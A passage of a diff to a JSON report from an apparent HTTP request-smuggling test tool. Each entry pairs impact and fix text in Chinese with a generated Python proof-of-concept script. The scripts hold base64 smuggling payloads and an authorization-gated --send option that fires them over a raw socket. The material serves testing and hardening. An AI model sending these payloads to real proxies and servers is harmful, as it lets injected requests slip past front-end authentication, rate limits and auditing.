= got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 63b954dd，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_63b954dd.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_63b954dd.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '63b954dd'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMHgzDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_63b954dd.py"
     },
     {
@@ -558,13 +813,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 137,
       "sample_len": 101,
@@ -577,7 +847,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 c8f519aa，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_c8f519aa.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_c8f519aa.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'c8f519aa'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('UE9TVCAgaHR0cDovL2xvY2FsaG9zdC8gSFRUUC8xLjENCkNvbnRlbnQtTGVuZ3RoOiAzDQoNCmFiY0dFVCAvc211Z2dsZWQgSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdA0KDQo=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 c8f519aa，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_c8f519aa.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_c8f519aa.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'c8f519aa'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('UE9TVCAgaHR0cDovL2xvY2FsaG9zdC8gSFRUUC8xLjENCkNvbnRlbnQtTGVuZ3RoOiAzDQoNCmFiY0dFVCAvc211Z2dsZWQgSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdA0KDQo=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_c8f519aa.py"
     },
     {
@@ -589,13 +859,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 77,
       "sample_len": 41,
@@ -608,7 +893,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 c6b4341c，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_c6b4341c.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_c6b4341c.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'c6b4341c'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 c6b4341c，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_c6b4341c.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_c6b4341c.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'c6b4341c'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_c6b4341c.py"
     },
     {
@@ -620,13 +905,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 96,
       "sample_len": 41,
@@ -639,7 +939,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 2204c027，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_2204c027.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_2204c027.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '2204c027'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 2204c027，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_2204c027.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_2204c027.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '2204c027'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 